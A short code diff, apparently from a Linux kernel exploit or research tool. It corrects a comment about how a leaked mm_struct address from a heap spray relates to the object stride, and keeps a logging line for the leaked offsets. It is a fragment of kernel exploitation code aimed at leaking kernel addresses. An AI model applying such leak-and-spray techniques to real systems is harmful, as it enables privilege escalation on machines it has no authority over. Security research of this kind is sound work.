@@ -647,8 +647,9 @@ uintptr_t prepare_kernel_page(void) {
     return 0;
   }
 
-  /* the leak sweeps every 8 bytes, so this reads which stride the real
-   * objects sit on. 0 means the run's stride assumption is right. */
+  /* the leak pass steps 8 bytes and reports a real mm_struct address, so this
+   * residue is always a multiple of 8 and is not a read on the true stride.
+   * 0 is common and does not mean the stride was right. */
   pr_info("[spray] leaked offset within stride 0x%zx (stride 0x%zx, within page 0x%zx)\n",
           (size_t)((leaked - KERNELSNITCH_IDENTITY_START) % mm_struct_sz()),
           (size_t)mm_struct_sz(),
